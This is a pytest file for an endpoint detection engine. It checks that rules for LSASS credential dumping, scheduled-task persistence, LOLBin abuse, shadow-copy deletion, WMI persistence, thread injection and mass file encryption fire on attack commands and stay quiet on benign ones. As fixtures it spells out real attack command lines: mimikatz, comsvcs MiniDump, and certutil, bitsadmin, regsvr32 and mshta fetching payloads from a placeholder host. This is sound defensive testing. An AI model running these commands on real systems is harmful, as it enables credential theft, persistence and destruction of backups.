"""The tradecraft rules in isolation: each attack variant fires, each ordinary look-alike stays quiet."""

from __future__ import annotations

from datetime import timedelta

import pytest
from sentinel_detect import Engine, StreamBuilder, SuppressionList
from sentinel_detect.rules_tradecraft import MassFileEncryption, encrypted_suffix
from sentinel_detect.suppression import Suppression

EXPLORER = r"C:\Windows\explorer.exe"
CMD = r"C:\Windows\System32\cmd.exe"
PWSH = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\winword.exe"
LSASS = r"C:\Windows\System32\lsass.exe"
SYS = "C:\\Windows\\System32\\"
TEMP_EXE = r"C:\Users\alice\AppData\Local\Temp\x.exe"


def run(events, **kw):
    return Engine(suppressions=SuppressionList([]), **kw).feed_stream(events)


def ids(detections):
    return {d.rule_id for d in detections}


def spawn(image: str, command_line: str, parent: str = CMD):
    b = StreamBuilder()
    b.process_create("P", image, parent_guid="C", parent_image=parent, command_line=command_line)
    return run(b.events)


# ---------------------------------------------------------------- LSASS


@pytest.mark.parametrize("mask", [0x1410, 0x1010, 0x1FFFFF, 0x0010])
def test_lsass_memory_read_fires(mask):
    b = StreamBuilder()
    b.process_access("X", LSASS, granted_access=mask, image=TEMP_EXE)
    out = run(b.events)
    assert ids(out) == {"cred.lsass_access"} and out[0].technique_ids == ["T1003.001"]


@pytest.mark.parametrize("mask", [0x1000, 0x0400, 0x100000])
def test_lsass_access_without_memory_read_is_quiet(mask):
    b = StreamBuilder()
    b.process_access("X", LSASS, granted_access=mask, image=TEMP_EXE)
    assert run(b.events) == []


def test_trusted_readers_are_matched_by_full_path_not_name():
    b = StreamBuilder()
    b.process_access("S", LSASS, image=SYS + "svchost.exe")
    assert run(b.events) == []
    b = StreamBuilder()
    b.process_access("S", LSASS, image=r"C:\Users\alice\AppData\Local\Temp\svchost.exe")  # impostor
    assert ids(run(b.events)) == {"cred.lsass_access"}


def test_access_to_other_processes_is_quiet():
    b = StreamBuilder()
    b.process_access("X", SYS + "notepad.exe", image=TEMP_EXE)
    assert run(b.events) == []


@pytest.mark.parametrize("cmd", [
    r"rundll32 C:\windows\system32\comsvcs.dll MiniDump 700 out.dmp full",
    "procdump64.exe -accepteula -ma lsass.exe out.dmp",
    'mimikatz "sekurlsa::logonpasswords" exit',
])
def test_dump_command_lines_fire_with_high_confidence(cmd):
    out = spawn(SYS + "rundll32.exe", cmd)
    assert ids(out) == {"cred.lsass_access"} and out[0].confidence == "high"


# ---------------------------------------------------------------- scheduled tasks


@pytest.mark.parametrize("cmd", [
    r'schtasks /create /tn x /tr "C:\Users\Public\a.exe" /sc onlogon',
    r"schtasks -create -tn x -tr %TEMP%\a.exe -sc minute",
    'schtasks /create /tn x /tr "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A" /sc daily',
    'schtasks /create /tn x /tr "mshta.exe C:\\ProgramData\\a.hta" /sc daily',
])
def test_task_with_suspicious_action_fires(cmd):
    assert ids(spawn(SYS + "schtasks.exe", cmd)) == {"persist.scheduled_task"}


def test_task_created_under_office_lineage_fires_even_with_plain_action():
    b = StreamBuilder()
    b.process_create("W", WINWORD, parent_guid="E", parent_image=EXPLORER)
    b.process_create("C", CMD, parent_guid="W", parent_image=WINWORD)
    b.process_create("S", SYS + "schtasks.exe", parent_guid="C", parent_image=CMD,
                     command_line=r'schtasks /create /tn x /tr "C:\Program Files\App\a.exe" /sc daily')
    assert "persist.scheduled_task" in ids(run(b.events))


@pytest.mark.parametrize("cmd", [
    r'schtasks /create /tn Backup /tr "C:\Program Files\Backup\run.exe" /sc daily',
    "schtasks /query", "schtasks /delete /tn old /f", "schtasks /run /tn Backup",
])
def test_ordinary_task_administration_is_quiet(cmd):
    assert spawn(SYS + "schtasks.exe", cmd) == []


# ---------------------------------------------------------------- LOLBins


@pytest.mark.parametrize(("image", "cmd", "technique"), [
    ("certutil.exe", "certutil -urlcache -f https://h.invalid/a a.exe", "T1105"),
    ("certutil.exe", "certutil /decode a.b64 a.exe", "T1140"),
    ("mshta.exe", 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc""")', "T1218.005"),
    ("mshta.exe", "mshta http://h.invalid/a.hta", "T1218.005"),
    ("bitsadmin.exe", "bitsadmin /addfile j http://h.invalid/a C:\\a", "T1197"),
    ("rundll32.exe", 'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)', "T1218.011"),
    ("rundll32.exe", r"rundll32 C:\Users\alice\AppData\Local\Temp\a.dll,Start", "T1218.011"),
    ("regsvr32.exe", "regsvr32 /s /n /u /i:http://h.invalid/a.sct scrobj.dll", "T1218.010"),
])
def test_lolbin_abuse_fires_with_the_specific_technique(image, cmd, technique):
    out = spawn(SYS + image, cmd)
    assert ids(out) == {"exec.lolbin_abuse"} and technique in out[0].technique_ids


@pytest.mark.parametrize(("image", "cmd"), [
    ("certutil.exe", "certutil -hashfile a.exe sha256"),
    ("certutil.exe", "certutil -urlcache * delete"),
    ("mshta.exe", r"mshta C:\Program Files\App\help.hta"),
    ("bitsadmin.exe", "bitsadmin /list /allusers"),
    ("rundll32.exe", r"rundll32 C:\Windows\System32\shell32.dll,Control_RunDLL"),
    ("regsvr32.exe", r"regsvr32 /s C:\Program Files\App\a.dll"),
])
def test_ordinary_lolbin_use_is_quiet(image, cmd):
    assert spawn(SYS + image, cmd) == []


# ---------------------------------------------------------------- recovery inhibition


@pytest.mark.parametrize(("image", "cmd"), [
    ("vssadmin.exe", "vssadmin delete shadows /all /quiet"),
    ("vssadmin.exe", "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB"),
    ("wmic.exe", "wmic shadowcopy delete"),
    ("wbadmin.exe", "wbadmin delete catalog -quiet"),
    ("bcdedit.exe", "bcdedit /set {default} recoveryenabled No"),
    ("bcdedit.exe", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"),
    ("WindowsPowerShell\\v1.0\\powershell.exe", "powershell Get-WmiObject Win32_ShadowCopy | Remove-WmiObject"),
])
def test_recovery_inhibition_fires(image, cmd):
    out = spawn(SYS + image, cmd)
    assert ids(out) == {"impact.recovery_inhibited"} and out[0].technique_ids == ["T1490"]


@pytest.mark.parametrize(("image", "cmd"), [
    ("vssadmin.exe", "vssadmin list shadows"), ("wmic.exe", "wmic shadowcopy list brief"),
    ("wbadmin.exe", "wbadmin get versions"), ("bcdedit.exe", "bcdedit /set {default} recoveryenabled yes"),
])
def test_reading_recovery_state_is_quiet(image, cmd):
    assert spawn(SYS + image, cmd) == []


# ---------------------------------------------------------------- WMI and injection


def test_wmi_script_consumer_fires_once_per_name():
    b = StreamBuilder()
    for _ in range(3):
        b.wmi_subscription("consumer", name="Upd", consumer_type="Script", destination="x.vbs")
    assert [d.rule_id for d in run(b.events)] == ["persist.wmi_subscription"]


def test_wmi_filter_and_binding_alone_are_quiet():
    b = StreamBuilder()
    b.wmi_subscription("filter", name="f", query="select * from x")
    b.wmi_subscription("binding", name="f")
    assert run(b.events) == []


def test_remote_thread_into_own_process_is_quiet():
    b = StreamBuilder()
    b.remote_thread("P", PWSH, image=PWSH, target_guid="P")
    assert run(b.events) == []


def test_remote_thread_from_temp_binary_fires():
    b = StreamBuilder()
    b.remote_thread("X", SYS + "explorer.exe", image=TEMP_EXE, target_guid="E")
    assert ids(run(b.events)) == {"inject.remote_thread"}


# ---------------------------------------------------------------- mass encryption


@pytest.mark.parametrize(("path", "expected"), [
    (r"C:\d\report.docx.locked", "locked"), (r"C:\d\a.b.pdf.ENCRYPTED", "encrypted"),
    (r"C:\d\report.docx", None), (r"C:\d\report.docx.tmp", None), (r"C:\d\archive.tar.gz", None),
    (r"C:\d\photo.jpg.zip", None), (r"C:\d\noext", None), (None, None),
])
def test_encrypted_suffix(path, expected):
    assert encrypted_suffix(path) == expected


def _burst(count: int, *, step_ms: int = 100, suffixes=("locked",)):
    b = StreamBuilder(step=timedelta(milliseconds=step_ms))
    for i in range(count):
        b.file_write("X", rf"C:\Users\a\Documents\f{i}.xlsx.{suffixes[i % len(suffixes)]}", image=TEMP_EXE)
    return b.events


def test_mass_encryption_fires_at_threshold_and_only_once():
    assert run(_burst(19)) == []
    out = run(_burst(60))
    assert [d.rule_id for d in out] == ["impact.mass_file_encryption"]
    assert out[0].severity == "critical" and len(out[0].events) <= 10


def test_slow_writes_never_fill_the_window():
    assert run(_burst(60, step_ms=5000)) == []  # one file every 5s: at most 13 inside a 60s window


def test_mixed_suffixes_are_not_one_campaign():
    assert run(_burst(60, suffixes=("aaa", "bbb", "ccc", "ddd"))) == []


def test_writes_are_counted_per_process():
    b = StreamBuilder(step=timedelta(milliseconds=100))
    for i in range(38):  # two processes, 19 each: neither reaches the threshold
        b.file_write(f"P{i % 2}", rf"C:\d\f{i}.docx.locked", image=TEMP_EXE)
    assert run(b.events) == []


def test_threshold_is_configurable_and_state_is_bounded():
    rule = MassFileEncryption(threshold=5, max_tracked=3)
    out = run(_burst(6), rules=[rule])
    assert len(out) == 1
    b = StreamBuilder()
    for i in range(50):
        b.file_write(f"G{i}", r"C:\d\a.docx.locked", image=TEMP_EXE)
    run(b.events, rules=[rule])
    assert len(rule._bursts) <= 3


def test_new_rules_respect_suppression():
    b = StreamBuilder()
    b.process_access("X", LSASS, image=r"C:\Program Files\EDR\sensor.exe")
    suppress = SuppressionList([Suppression(reason="our EDR", rule_id="cred.lsass_access",
                                            path_prefix="C:\\Program Files\\EDR\\")])
    assert Engine(suppressions=suppress).feed_stream(b.events) == []
    assert ids(run(b.events)) == {"cred.lsass_access"}
